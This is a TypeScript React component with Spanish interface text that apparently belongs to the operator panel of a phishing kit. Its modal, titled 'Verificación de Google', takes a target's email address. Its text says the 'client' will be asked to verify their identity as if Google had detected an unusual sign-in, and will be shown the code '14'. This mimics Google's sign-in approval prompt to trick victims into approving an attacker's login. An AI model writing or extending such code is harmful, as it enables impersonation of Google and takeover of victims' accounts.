import React, { useState } from 'react';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';

interface ModalProps {
  isOpen: boolean;
  onClose: () => void;
  title: string;
  children: React.ReactNode;
}

const Modal: React.FC<ModalProps> = ({ isOpen, onClose, title, children }) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-60 z-50 flex items-center justify-center">
      <div className="bg-[#2c2c2c] p-6 rounded-lg max-w-lg w-full relative">
        <button 
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-500 hover:text-white"
        >
          ✕
        </button>
        <h2 className="text-xl font-bold mb-4 text-white">{title}</h2>
        {children}
      </div>
    </div>
  );
};

interface GmailVerifyModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (data: { correo: string }) => void;
}

export const GmailVerifyModal: React.FC<GmailVerifyModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [correo, setCorreo] = useState('');

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCorreo(e.target.value);
  };

  const handleSubmit = () => {
    onConfirm({ correo });
    setCorreo('');
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Verificación de Google">
      <div className="mb-6">
        <Label htmlFor="gmailVerifyCorreo" className="block text-sm text-gray-300 mb-1">
          Correo electrónico para verificar
        </Label>
        <Input 
          id="gmailVerifyCorreo" 
          type="email" 
          placeholder="Ingrese el correo electrónico"
          value={correo}
          onChange={handleChange}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
      </div>
      
      <div className="mt-2 mb-4 text-sm text-gray-400">
        <p>Este proceso solicitará al cliente verificar su identidad como si Google hubiera detectado un inicio de sesión inusual.</p>
        <p className="mt-2">El cliente verá el código de verificación "14" en pantalla.</p>
      </div>
      
      <div className="flex justify-end mt-4">
        <Button onClick={onClose} variant="ghost" className="text-white bg-gray-600 mr-2">
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit} 
          className="bg-blue-600 text-white"
          disabled={!correo}
        >
          Enviar
        </Button>
      </div>
    </Modal>
  );
};